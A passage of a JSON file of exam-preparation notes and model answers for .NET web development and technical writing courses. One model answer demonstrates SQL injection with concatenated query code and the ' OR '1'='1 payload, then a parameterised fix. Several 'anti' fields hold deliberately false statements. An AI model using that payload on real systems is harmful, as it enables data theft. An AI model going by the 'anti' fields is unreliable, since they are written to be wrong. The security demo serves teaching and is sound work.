Centric Question 2081","marks":10,"rep":0},{"id":"ncc-3","q":"Why do we need ORM? List the components of ADO.NET. Assume a database with a relation BOOK(ID, NAME, PRICE). Write a function to fetch a list of books having price more than 1000 using ADO.NET.","y":"NET Centric Model 2082","marks":10,"rep":0},{"id":"ncc-39","q":"How do you cache the information of the client and what are its uses? Create a table named BAG(ID, Brand, Price, Date). Perform the following operations using Entity Framework Core.","y":"NET Centric Question 2080","marks":10,"rep":0},{"id":"ncc-20","q":"Explain the role of Connection, Command, Reader, and Adapter classes in ADO.NET. How do they work together to perform database operations?","y":"NET Centric Model Set","marks":5,"rep":0}],"reps":[]},{"n":6,"name":"State Management","rank":5,"q":8,"m":45,"share":9,"cum":68,"hook":"You log in, click one link, and the site asks you to log in again. What was never stored?","idea":"Cookies live in the browser and travel with every request, so they are small, visible and tamperable unless protected. Session keeps the data on the server and sends only an id cookie, so it escapes the size limit but needs a store. TempData carries one message across one redirect and is read once. ViewData lasts a single request; IMemoryCache is shared by all users until it expires or is removed.","one":"State is the memory HTTP refuses to keep, so you choose an owner, a lifetime and a trust boundary for every piece of it.","gate":{"q":"Why does a shopping cart survive a page reload when HTTP itself keeps no memory of the visitor?","a":"Because the cart is not in the protocol, it is in a store the server or browser owns. Session keeps the cart server-side and sends only an opaque id cookie, which every request carries back so middleware can reattach the right dictionary, while a database row keyed to the user does the same. Clear the cookie or let it expire and the cart is gone."},"top":{"id":"ncc-40","q":"How do you manage state on stateless HTTP? How do you validate form using JQuery? Describe with your own assumptions.","y":"NET Centric Question 2080","marks":10,"rep":0,"ans":"HTTP is stateless: each request is independent, so the server cannot tell that two requests came from the same user. State is therefore carried by the client or stored on the server under an identifier.\nClient-side: query string (?page=2), hidden fields, cookies (session id, auth ticket — set HttpOnly, Secure, SameSite), localStorage/sessionStorage, and a JWT held in memory.\nServer-side: Session (per user, SessionId cookie, AddSession/UseSession), TempData (survives one redirect), ViewData/ViewBag (one request), Cache (application-wide), HttpContext.Items (one request).\nPattern: on login the server creates a session, sets an HttpOnly cookie and stores the cart in the session store; every later request sends the cookie and the server reloads the state.\njQuery validation (registration form):\n$(\"#reg\").on(\"submit\", function (e) {\n  var ok = true;\n  $(\"#reg input[required]\").each(function () {\n    if ($.trim($(this).val()) === \"\") { $(this).addClass(\"err\"); ok = false; }\n  });\n  if ($(\"#email\").val().indexOf(\"@\") < 0) ok = false;\n  if ($(\"#pwd\").val().length < 6) ok = false;\n  if (!ok) { e.preventDefault(); $(\"#msg\").text(\"Check the form\"); }\n});\nThe server repeats every rule with data annotations and ModelState.IsValid.","skel":["HTTP is stateless, so state is carried or stored","Client: query, hidden, cookie, localStorage, JWT","Server: Session, TempData, ViewData, Cache","Login sets a cookie and stores the session","jQuery: flag, checks, preventDefault"],"logic":"A broad question asking for the whole state toolkit plus working jQuery validation. It rewards a complete client/server table and a runnable handler.","how":"Two halves: state techniques grouped client and server with the login pattern, then one submit handler. Keep the code to eight lines.","gateA":"HTTP is stateless: each request is independent, so the server cannot tell that two requests came from the same user. State is therefore carried by the client or stored on the server under an identifier.\nClient-side: query string (?page=2), hidden fields, cookies (session id, auth ticket — set HttpOnly, Secure, SameSite), localStorage/sessionStorage, and a JWT held in memory.\nServer-side: Session (per user, SessionId cookie, AddSession/UseSession), TempData (survives one redirect), ViewData/ViewBag (one request), Cache (application-wide), HttpContext.Items (one request).\nPattern: on login the server creates a session, sets an HttpOnly cookie and stores the cart in the session store; every later request sends the cookie and the server reloads the state.\njQuery validation (registration form):\n$(\"#reg\").on(\"submit\", function (e) {\n  var ok = true;\n  $(\"#reg input[required]\").each(function () {\n    if ($.trim($(this).val()) === \"\") { $(this).addClass(\"err\"); ok = false; }\n  });\n  if ($(\"#email\").val().indexOf(\"@\") < 0) ok = false;\n  if ($(\"#pwd\").val().length < 6) ok = false;\n  if (!ok) { e.preventDefault(); $(\"#msg\").text(\"Check the form\"); }\n});\nThe server repeats every rule with data annotations and ModelState.IsValid. HTTP is stateless, so state is carried or stored Client: query, hidden, cookie, localStorage, JWT Server: Session, TempData, ViewData, Cache Login sets a cookie and stores the session jQuery: flag, checks, preventDefault","anti":"HTTP is stateful, so the server always knows which user sent a request and no state needs to be carried; cookies are server memory, Session is client-side, and jQuery validation should submit the form before checking it."},"keys":["Stateless HTTP","Session","TempData","Peek and Keep","ViewData and ViewBag","HttpContext.Items"],"ask":[{"id":"ncc-40","q":"How do you manage state on stateless HTTP? How do you validate form using JQuery? Describe with your own assumptions.","y":"NET Centric Question 2080","marks":10,"rep":0},{"id":"ncc-10","q":"What is the use of a partial class? Discuss session state.","y":"NET Centric Model 2082","marks":5,"rep":0},{"id":"ncc-21","q":"What is TempData? How is it different from Session state and ViewData? When would you use TempData over other state management techniques","y":"NET Centric Model Set","marks":5,"rep":0},{"id":"ncc-22","q":"Explain the use of Cache as a server-side state management strategy. What are the benefits of caching in web applications?","y":"NET Centric Model Set","marks":5,"rep":0}],"reps":[]},{"n":2,"name":"Introduction to ASP.NET","rank":6,"q":7,"m":45,"share":9,"cum":78,"hook":"Why does the same web application need a different installer on Windows, on Linux and on a phone?","idea":".NET Framework is the Windows-only runtime the old web stack assumed. .NET Core and .NET 5+ are cross-platform, open source and modular: the runtime and libraries arrive as NuGet packages with the application, so versions sit side by side. Mono is a separate implementation for other platforms, .NET Standard a contract of shared APIs, and ASP.NET Core one chassis carrying MVC, Web API, Razor Pages and SignalR. Because the runtime is resolved per application rather than installed once for the machine, each project restores its framework and the host loads it inside that application's own process, where a machine-wide framework would force every site onto one version and one update cycle.","one":"ASP.NET Core is a cross-platform runtime plus per-project packages, not a Windows feature, and one chassis carries every web style.","gate":{"q":"Why can two ASP.NET Core applications that need different runtime versions run side by side on one server?","a":"Because the runtime is resolved per application rather than installed once for the machine. Each project restores the framework as NuGet packages or names the shared runtime version in its csproj, and the host loads it inside that application's own process. A machine-wide framework would force every site on the server onto one version and one update cycle."},"top":{"id":"ncc-15","q":"Differentiate between .NET, .NET Core, and Mono frameworks. Explain the compilation and execution process of .NET applications covering CLI, MSIL, and CLR. Discuss different hosting models for ASP.NET Core applications: IIS, Nginx, Kestrel, and Docker containerization.","y":"NET Centric Model Set","marks":10,"rep":0,"ans":"• .NET Framework — the original Windows-only implementation (to 4.8), installed with Windows, hosting Web Forms, WCF and WPF.\n• .NET Core / .NET 5+ — open-source, cross-platform, modular NuGet packages, side-by-side versions, much faster; the current line.\n• Mono — a third-party reimplementation of .NET Framework for Linux, Android and iOS, which made Xamarin possible; largely superseded by .NET 6+.\nCompilation and execution:\nC# source → Roslyn compiler → MSIL (CIL) plus metadata packed into an assembly (.dll) → at run time the CLR loads it, verifies type safety, JIT-compiles MSIL to native code and executes it. CLI is the umbrella standard: CTS (one type system), CLS (common language subset), VES (execution engine). MSIL is CPU-independent, so one DLL runs anywhere a CLR exists.\nHosting models:\n• Kestrel — the built-in cross-platform server; fast, async, handles HTTPS itself, usually behind a proxy.\n• IIS — in-process (ANCM loads the app inside w3wp, no proxy hop, fastest on Windows) or out-of-process (IIS reverse-proxies to Kestrel and ANCM manages the process).\n• Nginx — Linux reverse proxy: TLS termination, static files, load balancing, then Kestrel.\n• Docker — app plus runtime in an image, run by the container runtime and scaled by Kubernetes.","skel":["Framework vs Core vs Mono in a line each","Source → Roslyn → MSIL + metadata → assembly","CLR loads, verifies, JITs to native","CLI = CTS + CLS + VES","Kestrel, IIS in/out of process, Nginx, Docker"],"logic":"A three-part history-and-plumbing question. It rewards knowing that MSIL is CPU-independent and that in-process IIS skips the proxy hop — not memorised marketing terms.","how":"Three headed blocks with a one-line table for the frameworks and a source → IL → JIT arrow. Keep each hosting model to one line so all four fit.","gateA":"• .NET Framework — the original Windows-only implementation (to 4.8), installed with Windows, hosting Web Forms, WCF and WPF.\n• .NET Core / .NET 5+ — open-source, cross-platform, modular NuGet packages, side-by-side versions, much faster; the current line.\n• Mono — a third-party reimplementation of .NET Framework for Linux, Android and iOS, which made Xamarin possible; largely superseded by .NET 6+.\nCompilation and execution:\nC# source → Roslyn compiler → MSIL (CIL) plus metadata packed into an assembly (.dll) → at run time the CLR loads it, verifies type safety, JIT-compiles MSIL to native code and executes it. CLI is the umbrella standard: CTS (one type system), CLS (common language subset), VES (execution engine). MSIL is CPU-independent, so one DLL runs anywhere a CLR exists.\nHosting models:\n• Kestrel — the built-in cross-platform server; fast, async, handles HTTPS itself, usually behind a proxy.\n• IIS — in-process (ANCM loads the app inside w3wp, no proxy hop, fastest on Windows) or out-of-process (IIS reverse-proxies to Kestrel and ANCM manages the process).\n• Nginx — Linux reverse proxy: TLS termination, static files, load balancing, then Kestrel.\n• Docker — app plus runtime in an image, run by the container runtime and scaled by Kubernetes. Framework vs Core vs Mono in a line each Source → Roslyn → MSIL + metadata → assembly CLR loads, verifies, JITs to native CLI = CTS + CLS + VES Kestrel, IIS in/out of process, Nginx, Docker","anti":""},"keys":[".NET Framework",".NET Core / .NET 5+","Mono",".NET Standard","Web Forms","ASP.NET MVC"],"ask":[{"id":"ncc-15","q":"Differentiate between .NET, .NET Core, and Mono frameworks. Explain the compilation and execution process of .NET applications covering CLI, MSIL, and CLR. Discuss different hosting models for ASP.NET Core applications: IIS, Nginx, Kestrel, and Docker containerization.","y":"NET Centric Model Set","marks":10,"rep":0},{"id":"ncc-57","q":"What is the purpose of web form? Write a program to demonstrate the concept of collection and generics.","y":"NET Centric Question 2079","marks":10,"rep":0},{"id":"ncc-5","q":"What are the logics behind the .NET architecture and design principles? Explain.","y":"NET Centric Model 2082","marks":5,"rep":0},{"id":"ncc-51","q":"Answer the following questions in short.","y":"NET Centric Question 2076","marks":5,"rep":0}],"reps":[]},{"n":9,"name":"Hosting and Deployment","rank":7,"q":7,"m":45,"share":9,"cum":87,"hook":"The application runs on your laptop and dies on the server: same code, different front door.","idea":"Kestrel is the cross-platform web server that owns the socket; IIS, Nginx or Apache usually sit in front as a reverse proxy for TLS, compression and load balancing. In-process hosting runs the app inside the IIS worker process, while out-of-process has the ASP.NET Core Module forward requests to a separate Kestrel. A multi-stage Dockerfile compiles on the SDK image and copies only the published output onto the smaller runtime image. Because the proxy forwards rather than executes, it terminates TLS and passes plain HTTP to a Kestrel process listening on localhost, so forwarded headers must be honoured and TLS must be terminated in exactly one place.","one":"Deployment is deciding who owns the socket and where configuration lives: Kestrel serves, a proxy fronts it, a container carries it.","gate":{"q":"Why must an ASP.NET Core application keep Kestrel even when IIS or Nginx sits in front of it?","a":"Because the proxy forwards rather than executes. IIS through the ASP.NET Core Module, and Nginx on Linux, terminate TLS and pass plain HTTP to a Kestrel process listening on localhost, which is the only server that understands the application. That is why forwarded headers must be honoured and TLS must be terminated in exactly one place."},"top":{"id":"ncc-70","q":"Explain the procedure for building, running, and deploying .NET core applications. Write a program to show the possibility of SQL injection attack.","y":"NET Centric Question 2078","marks":10,"rep":2,"ans":"Procedure:\n1. dotnet new mvc -n CollegeApp creates the project.\n2. dotnet restore pulls NuGet packages; dotnet build compiles to bin/Debug.\n3. dotnet run starts Kestrel on localhost:5000 (or F5 in Visual Studio).\n4. dotnet test runs the test project.\n5. dotnet publish -c Release -o ./publish produces the deployable output: dll, Views, wwwroot, appsettings.\n6. Copy it to the server; install the ASP.NET Core Hosting Bundle for IIS (or publish --self-contained), create the site with ANCM, reverse-proxy Nginx to Kestrel, or build a Docker image.\n7. Set ASPNETCORE_ENVIRONMENT=Production and connection strings as environment variables, apply EF migrations, enable HTTPS, then smoke-test.\n\nSQL injection demo:\nstring sql = \"SELECT * FROM Users WHERE Name='\" + txtName.Text + \"'\";\n// attacker enters:  ' OR '1'='1\nThe query becomes SELECT * FROM Users WHERE Name='' OR '1'='1', which returns every row, so the page lists all users.\nFixed: var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name=@n\", con); cmd.Parameters.AddWithValue(\"@n\", txtName.Text);\nThe input is now data, never SQL.","skel":["new, restore, build, run, test","publish -c Release, then host","Env vars and migrations","Concatenated query plus ' OR '1'='1","Parameterised fix"],"logic":"Combines the CLI pipeline with a security demo; the marks are in the ordered commands and a query that visibly returns every row.","how":"Number the seven commands, then six lines of vulnerable code with the crafted input and the fixed version.","gateA":"Procedure:\n1. dotnet new mvc -n CollegeApp creates the project.\n2. dotnet restore pulls NuGet packages; dotnet build compiles to bin/Debug.\n3. dotnet run starts Kestrel on localhost:5000 (or F5 in Visual Studio).\n4. dotnet test runs the test project.\n5. dotnet publish -c Release -o ./publish produces the deployable output: dll, Views, wwwroot, appsettings.\n6. Copy it to the server; install the ASP.NET Core Hosting Bundle for IIS (or publish --self-contained), create the site with ANCM, reverse-proxy Nginx to Kestrel, or build a Docker image.\n7. Set ASPNETCORE_ENVIRONMENT=Production and connection strings as environment variables, apply EF migrations, enable HTTPS, then smoke-test.\n\nSQL injection demo:\nstring sql = \"SELECT * FROM Users WHERE Name='\" + txtName.Text + \"'\";\n// attacker enters:  ' OR '1'='1\nThe query becomes SELECT * FROM Users WHERE Name='' OR '1'='1', which returns every row, so the page lists all users.\nFixed: var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name=@n\", con); cmd.Parameters.AddWithValue(\"@n\", txtName.Text);\nThe input is now data, never SQL. new, restore, build, run, test publish -c Release, then host Env vars and migrations Concatenated query plus ' OR '1'='1 Parameterised fix","anti":""},"keys":["Kestrel","In-process hosting","Out-of-process hosting","ANCM","Nginx","Dockerfile"],"ask":[{"id":"ncc-70","q":"Explain the procedure for building, running, and deploying .NET core applications. Write a program to show the possibility of SQL injection attack.","y":"NET Centric Question 2078","marks":10,"rep":2},{"id":"ncc-59","q":"Describe any two hosting models for core application. Design a client side validation application using jquery for taking input data from student in Library Management System, assume your own assumptions.","y":"NET Centric Question 2079","marks":10,"rep":0},{"id":"ncc-11","q":"Explain the core differences between a traditional Virtual Machine (VM) and a Docker container.","y":"NET Centric Model 2082","marks":5,"rep":0},{"id":"ncc-25","q":"What is the ASP.NET Core Module? How does it work with IIS to host ASP.NET Core applications?","y":"NET Centric Model Set","marks":5,"rep":0}],"reps":[{"id":"r10","q":"Explain the procedure for building, running, and deploying .NET core applications. Write a program to show the possibility of SQL injection attack.","count":2,"marks":10}]},{"n":3,"name":"HTTP and ASP.NET Core","rank":8,"q":6,"m":35,"share":7,"cum":94,"hook":"Every request enters by the same door, yet a stylesheet and a login page are handled by different guards.","idea":"Kestrel accepts the connection and parses one HTTP message: method, path, headers, optional body. It passes that into a middleware pipeline assembled in Program.cs, where each component may act, pass on, or stop and write a response. Order is the contract: exception handling, HTTPS, static files, routing, authentication, authorization, endpoints. The controller works with the model and returns a view, and the response retraces the same layers.","one":"A request is one HTTP message walked through an ordered pipeline, and the first layer that answers ends the journey.","gate":{"q":"Why does a request for a stylesheet never reach the controller while a request for a protected page does?","a":"Because both enter the same pipeline but stop at different layers. Static file middleware recognises the extension, writes the file and short-circuits, so routing, authentication and the action never run. A page URL matches no file, falls through to routing and the endpoint, so authentication and authorization must approve it before the action executes."},"top":{"id":"ncc-71","q":"What are the advantages of stateless HTTP in ASP.NET core application? Create a method to insert a record (3, “John , 12000”) onto the table Employee having fields Employeeld(int), Name varchar(200), Salary(int) using Entity Framework.","y":"NET Centric Question 2078","marks":10,"rep":0,"ans":"Stateless HTTP - each request carries everything the server needs, and the server keeps no memory of earlier requests.\nAdvantages:\n• Scalability - any server in the farm can serve any request, so load balancers add nodes freely.\n• Low server memory; no per-user session objects to replicate.\n• Resilience - a crashed node loses nothing, the client simply retries.\n• Caching and CDN friendliness; GET responses can be cached.\n• Simpler testing, debugging and REST API design, with clean client-server separation.\nCost: state must be carried (cookie, token, hidden field) or stored (session, cache, database).\n\nInsert with EF Core:\npublic class Employee { public int EmployeeId { get; set; } public string Name { get; set; } public int Salary { get; set; } }\npublic class AppDbContext : DbContext {\n    public AppDbContext(DbContextOptions<AppDbContext> o) : base(o) { }\n    public DbSet<Employee> Employees => Set<Employee>();\n}\npublic async Task<int> AddJohn() {\n    var e = new Employee { EmployeeId = 3, Name = \"John\", Salary = 12000 };\n    _db.Employees.Add(e);\n    return await _db.SaveChangesAsync();   // 1 row inserted\n}\nSaveChanges generates INSERT INTO Employee VALUES (3,'John',12000).","skel":["Any server can serve any request","No per-user memory, easy to scale","Crash-safe and cache friendly","State must be carried or stored","Add plus SaveChangesAsync"],"logic":"Tests why statelessness is a design advantage (not a flaw) and then whether you can write an EF Core insert, not an ADO.NET one.","how":"Five advantage bullets, one cost line, then the Employee class, DbContext and a six-line insert method.","gateA":"Stateless HTTP - each request carries everything the server needs, and the server keeps no memory of earlier requests.\nAdvantages:\n• Scalability - any server in the farm can serve any request, so load balancers add nodes freely.\n• Low server memory; no per-user session objects to replicate.\n• Resilience - a crashed node loses nothing, the client simply retries.\n• Caching and CDN friendliness; GET responses can be cached.\n• Simpler testing, debugging and REST API design, with clean client-server separation.\nCost: state must be carried (cookie, token, hidden field) or stored (session, cache, database).\n\nInsert with EF Core:\npublic class Employee { public int EmployeeId { get; set; } public string Name { get; set; } public int Salary { get; set; } }\npublic class AppDbContext : DbContext {\n    public AppDbContext(DbContextOptions<AppDbContext> o) : base(o) { }\n    public DbSet<Employee> Employees => Set<Employee>();\n}\npublic async Task<int> AddJohn() {\n    var e = new Employee { EmployeeId = 3, Name = \"John\", Salary = 12000 };\n    _db.Employees.Add(e);\n    return await _db.SaveChangesAsync();   // 1 row inserted\n}\nSaveChanges generates INSERT INTO Employee VALUES (3,'John',12000). Any server can serve any request No per-user memory, easy to scale Crash-safe and cache friendly State must be carried or stored Add plus SaveChangesAsync","anti":""},"keys":["HTTP","Request line","Status codes","Idempotent methods","Kestrel","Middleware pipeline"],"ask":[{"id":"ncc-71","q":"What are the advantages of stateless HTTP in ASP.NET core application? Create a method to insert a record (3, “John , 12000”) onto the table Employee having fields Employeeld(int), Name varchar(200), Salary(int) using Entity Framework.","y":"NET Centric Question 2078","marks":10,"rep":0},{"id":"ncc-18","q":"Describe the ASP.NET Core architecture overview. How does it differ from traditional ASP.NET framework architecture?","y":"NET Centric Model Set","marks":5,"rep":0},{"id":"ncc-31","q":"How does ASP.NET core MVC provides patterns-based way to build dynamic website? Explain.","y":"Net Centric Question 2081","marks":5,"rep":0},{"id":"ncc-6","q":"Describe any four ways to read HTTP response in ASP.NET Core.","y":"NET Centric Model 2082","marks":5,"rep":0}],"reps":[]},{"n":7,"name":"Client-side Development","rank":9,"q":6,"m":30,"share":6,"cum":100,"hook":"The form was validated before it was sent, and the server still rejected it. Which side was lying?","idea":"Client-side code runs in the browser and can be read, skipped or replaced, so it buys speed, never authority: the browser is a runtime the visitor controls and cannot grant authority. The script is downloaded, readable and disposable, so a direct request, a disabled script or an edited form reaches the action with any values at all. ModelState re-runs the same annotations server-side before the database is touched, which is why client rules only save round trips. jQuery with unobtrusive validation mirrors those rules for instant feedback, AJAX exchanges JSON without a reload, and a SPA renders and routes in the browser and calls a Web API.","one":"The browser is a second runtime that may be fast but must never be trusted; every check it does, the server repeats.","gate":{"q":"Why must the server repeat a validation rule the browser has already enforced?","a":"Because the browser is a runtime the visitor controls and cannot grant authority. The script is downloaded, readable and disposable, so a direct request, a disabled script or an edited form reaches the action with any values at all. ModelState re-runs the same annotations server-side before the database is touched, which is why client rules only save round trips."},"top":{"id":"ncc-23","q":"Compare Angular and React frameworks for building Single Page Applications (SPA) with ASP.NET Core backend. What are the advantages and disadvantages of each?","y":"NET Centric Model Set","marks":5,"rep":0,"ans":"Both build SPAs that call an ASP.NET Core Web API returning JSON; they differ in scope and model.\n• Angular — a full framework from Google: TypeScript, components and modules, built-in DI and routing, HttpClient with RxJS observables, two-way binding and an opinionated CLI. Advantages: everything included, consistent structure for large teams, strong typing and testability. Disadvantages: steep learning curve, heavier bundle, more ceremony and version churn.\n• React — a library from Meta: JSX, function components and hooks, one-way data flow, a virtual DOM, with routing and state from third parties (React Router, Redux). Advantages: small learning curve, huge ecosystem, flexible, very fast rendering, largest talent pool. Disadvantages: too many choices, frequent ecosystem change, JSX mixes markup into JavaScript.\nChoose Angular for a large enterprise team that wants conventions enforced; choose React for flexibility and hiring. Either is served from wwwroot or a separate dev server with a proxy, and both authenticate with a JWT or cookie against the same API.","skel":["Both call the same Web API for JSON","Angular: full framework, TypeScript, RxJS, DI","React: library, JSX, hooks, virtual DOM","Pros and cons for each","Choose by team size and structure"],"logic":"Tests judgement between two SPA options for an ASP.NET Core API. Answers that list features without advantages/disadvantages and a recommendation lose marks.","how":"Two columns in your head: framework versus library, then pros and cons each, then one recommendation line. Bulk of marks is in the trade-off.","gateA":"Both build SPAs that call an ASP.NET Core Web API returning JSON; they differ in scope and model.\n• Angular — a full framework from Google: TypeScript, components and modules, built-in DI and routing, HttpClient with RxJS observables, two-way binding and an opinionated CLI. Advantages: everything included, consistent structure for large teams, strong typing and testability. Disadvantages: steep learning curve, heavier bundle, more ceremony and version churn.\n• React — a library from Meta: JSX, function components and hooks, one-way data flow, a virtual DOM, with routing and state from third parties (React Router, Redux). Advantages: small learning curve, huge ecosystem, flexible, very fast rendering, largest talent pool. Disadvantages: too many choices, frequent ecosystem change, JSX mixes markup into JavaScript.\nChoose Angular for a large enterprise team that wants conventions enforced; choose React for flexibility and hiring. Either is served from wwwroot or a separate dev server with a proxy, and both authenticate with a JWT or cookie against the same API. Both call the same Web API for JSON Angular: full framework, TypeScript, RxJS, DI React: library, JSX, hooks, virtual DOM Pros and cons for each Choose by team size and structure","anti":""},"keys":["Unobtrusive validation","jQuery AJAX","_ValidationScriptsPartial","SPA","Angular","React"],"ask":[{"id":"ncc-23","q":"Compare Angular and React frameworks for building Single Page Applications (SPA) with ASP.NET Core backend. What are the advantages and disadvantages of each?","y":"NET Centric Model Set","marks":5,"rep":0},{"id":"ncc-33","q":"Write a program to validate the form that takes input user name, password and phone number using JQuery. All fields must be non-empty and phone number must contain exactly 10 digits.","y":"Net Centric Question 2081","marks":5,"rep":0},{"id":"ncc-56","q":"a. Explain the client-side scripting with practical example.","y":"NET Centric Question 2076","marks":5,"rep":0},{"id":"ncc-62","q":"What does single page application means? Discuss about server side strategies.","y":"NET Centric Question 2079","marks":5,"rep":0}],"reps":[]}]},"tw":{"name":"Technical Writing","code":"CSC379","exam":"2026-12-23","totalQ":95,"totalM":665,"units":[{"n":1,"name":"What Is Technical Writing","rank":1,"q":13,"m":95,"share":14,"cum":14,"hook":"A water pump bought in Asan comes with a glossy brochure, and a folded sheet with a diagram and three warnings.","idea":"Technical writing is writing that changes what a specific reader can do, so its success test is behavioural, not aesthetic. Its characteristics follow from that: clarity removes ambiguity about who does what, accuracy keeps a verified number usable, and organisation lets a scanning reader reach the step. The consequence is measurable, since a correct installation with no support call proves the document worked; creative writing is judged by how it makes you feel, technical writing by whether the task gets done.","one":"Technical writing is judged by what the reader can do afterwards, not by how good the prose sounds.","gate":{"q":"Why is technical writing judged by what the reader can do afterwards rather than by how the prose sounds?","a":"Technical writing exists to change an action, so its success test is behavioural, not aesthetic. Its characteristics follow from that: clarity removes ambiguity about who does what, accuracy keeps a verified number usable, and organisation lets a scanning reader reach the step. The consequence is measurable, since a correct installation with no support call proves the document worked."},"top":{"id":"tw-66","q":"Write in detail on advantages and disadvantages using Facebook, Twitter and google+ for communication. In your write up use these expressions! in brief, whereas, however, though, even though, at first, in general, finally.","y":"TW Question Bank 2075","marks":10,"rep":0,"ans":"Social media are now everyday workplace communication tools. In brief, they give reach and speed; the cost is distraction.\n\nFacebook: in general, it is the widest net — pages and groups reach parents, students and customers in one post. At first a college page looks informal, though it works well for announcements and event photographs. However, mixing personal and professional contacts blurs boundaries.\n\nTwitter: fast, public and text-first. It suits live updates and complaints, whereas Facebook suits longer posts and images. Even though a short limit forces brevity, it also invites misunderstanding.\n\nGoogle+: built for circles and long technical posts; it never reached a mass Nepali audience, so topic communities came with low reach.\n\nCommon drawbacks: rumour spreads faster than correction, tone is easily misread, and privacy settings change without notice. Finally, use social media to supplement email and formal documents, never to replace them.","skel":["One-line balanced verdict to open","Facebook, Twitter, Google+ — one strength each","Shared drawback section","All eight expressions used and ticked"],"logic":"Probes whether you can compare three platforms objectively and still control cohesion. The eight given connectors are marked individually, so each must appear naturally.","how":"Underline all eight expressions first, then give each platform one strength and one weakness. Tick each connector off as you use it.","gateA":"Social media are now everyday workplace communication tools. In brief, they give reach and speed; the cost is distraction.\n\nFacebook: in general, it is the widest net — pages and groups reach parents, students and customers in one post. At first a college page looks informal, though it works well for announcements and event photographs. However, mixing personal and professional contacts blurs boundaries.\n\nTwitter: fast, public and text-first. It suits live updates and complaints, whereas Facebook suits longer posts and images. Even though a short limit forces brevity, it also invites misunderstanding.\n\nGoogle+: built for circles and long technical posts; it never reached a mass Nepali audience, so topic communities came with low reach.\n\nCommon drawbacks: rumour spreads faster than correction, tone is easily misread, and privacy settings change without notice. Finally, use social media to supplement email and formal documents, never to replace them. One-line balanced verdict to open Facebook, Twitter, Google+ — one strength each Shared drawback section All eight expressions used and ticked","anti":"Social media are unsuitable for workplace communication because they give no reach and slow every message; Facebook is the narrowest channel, Twitter cannot broadcast, and Google+ is the most formal, so the drawbacks outweigh every advantage."},"keys":["Technical writing","Clarity","Conciseness","Accuracy","Audience awareness","Objectivity"],"ask":[{"id":"tw-66","q":"Write in detail on advantages and disadvantages using Facebook, Twitter and google+ for communication. In your write up use these expressions! in brief, whereas, however, though, even though, at first, in general, finally.","y":"TW Question Bank 2075","marks":10,"rep":0},{"id":"tw-68","q":"Define “simple sentence”, “complex sentence” and “compound sentence”. Give three examples for each type.","y":"TW Question Bank 2075","marks":10,"rep":0},{"id":"tw-69","q":"What’s technical communication? How does it differ from other types of communication? What features help making communication ‘technical’?","y":"TW Question Bank 2075","marks":10,"rep":0},{"id":"tw-70","q":"What skills do you need to improve your technical writing? How can you acquire those","y":"TW Question Bank 2079","marks":10,"rep":0}],"reps":[]},{"n":3,"name":"The Writing Process","rank":2,"q":12,"m":85,"share":13,"cum":27,"hook":"A mason builds a boundary wall in one pass and finds it leaning at the far end, with the cement already set.","idea":"The process separates thinking from wording from polishing, because each needs a different kind of attention and doing all three at once does none well. Planning decides what the document is, drafting produces material without judging it, revising judges structure and content, copyediting fixes the surface, publishing puts it in the reader's hands. It loops, because a revision can send you back to planning.","one":"Draft fast, revise the structure, then polish the words — never all three at the same time.","gate":{"q":"Why does the writing process place revision before copyediting instead of polishing as you draft?","a":"Each stage needs a different attention, and mixing them does none well. Drafting without judging keeps pace and exposes missing structure, revising then tests content, order and completeness against the purpose, and copyediting fixes grammar and consistency only after the structure has stopped moving. Polishing a section that should be cut is wasted work, so the order protects the deadline."},"top":{"id":"tw-14","q":"Explain the complete technical writing process from planning to publishing. How does collaborative writing enhance or complicate this process? Discuss the advantages, challenges, and conflict resolution strategies in collaborative writing. Support your answer with examples from software documentation or IT project scenarios.","y":"TW Model Set I","marks":10,"rep":0,"ans":"Planning, drafting, revising, copyediting, publishing. Collaboration changes how each stage runs, not the stages themselves.\nPlanning: one writer fixes purpose, audience and outline; sections and deadlines are assigned.\nDrafting: parts are written in parallel by whoever is closest to the knowledge — a developer writes the API reference, a tester the known issues.\nRevising: a comment-and-track-changes review cycle, where conflicts surface.\nCopyediting: one editor applies a single style sheet so the document reads in one voice.\nPublishing: one owner controls the final version and the archive.\n\nAdvantages: expertise coverage, speed, peer review, stakeholder buy-in.\nChallenges: coordination cost, inconsistent voice, version conflicts, free-riding, slow decisions.\nConflict resolution: agree outline and style guide before writing; give one editor final say on language; settle disputes by evidence and reader need, not seniority; escalate to the document owner with a deadline; log every decision in the shared file.\nExample: a manual by four authors fails when each names the same button differently — the style sheet is the fix.","skel":["Five stages, collaborative version of each","Advantages: expertise, speed, review, buy-in","Challenges: voice, versions, free-riding","Conflict: style sheet, single editor, evidence","Example: four authors, one term per button"],"logic":"Asks for both sides of collaboration and a resolution strategy. Most answers list advantages only; the marks for challenges and conflict handling are what separate a 10 from a 6.","how":"Five stages in one line each, then advantages, challenges, and four conflict strategies. Give one documentation example at the end.","gateA":"Planning, drafting, revising, copyediting, publishing. Collaboration changes how each stage runs, not the stages themselves.\nPlanning: one writer fixes purpose, audience and outline; sections and deadlines are assigned.\nDrafting: parts are written in parallel by whoever is closest to the knowledge — a developer writes the API reference, a tester the known issues.\nRevising: a comment-and-track-changes review cycle, where conflicts surface.\nCopyediting: one editor applies a single style sheet so the document reads in one voice.\nPublishing: one owner controls the final version and the archive.\n\nAdvantages: expertise coverage, speed, peer review, stakeholder buy-in.\nChallenges: coordination cost, inconsistent voice, version conflicts, free-riding, slow decisions.\nConflict resolution: agree outline and style guide before writing; give one editor final say on language; settle disputes by evidence and reader need, not seniority; escalate to the document owner with a deadline; log every decision in the shared file.\nExample: a manual by four authors fails when each names the same button differently — the style sheet is the fix. Five stages, collaborative version of each Advantages: expertise, speed, review, buy-in Challenges: voice, versions, free-riding Conflict: style sheet, single editor, evidence Example: four authors, one term per button","anti":"The writing process runs from publishing back to planning: drafting comes before planning, revision is optional, and collaboration removes every stage; a single writer is always faster and voice, versions and free-riding never arise."},"keys":["Planning","Drafting","Revising","Copyediting","Proofreading","Publishing"],"ask":[{"id":"tw-14","q":"Explain the complete technical writing process from planning to publishing. How does collaborative writing enhance or complicate this process? Discuss the advantages, challenges, and conflict resolution strategies in collaborative writing. Support your answer with examples from software documentation or IT project scenarios.","y":"TW Model Set I","marks":10,"rep":0},{"id":"tw-2","q":"Discuss the writing process for technical documents. Illustrate each stage with relevant examples from IT workplace writing.","y":"TW Question Bank 2082","marks":10,"rep":0},{"id":"tw-44","q":"As writing is not an overnight endeavor it follows a certain process. Discuss a process for technical writing.","y":"TW Question Bank 2080","marks":10,"rep":0},{"id":"tw-71","q":"How important is a collaborative effort in preparing documents? Discuss its 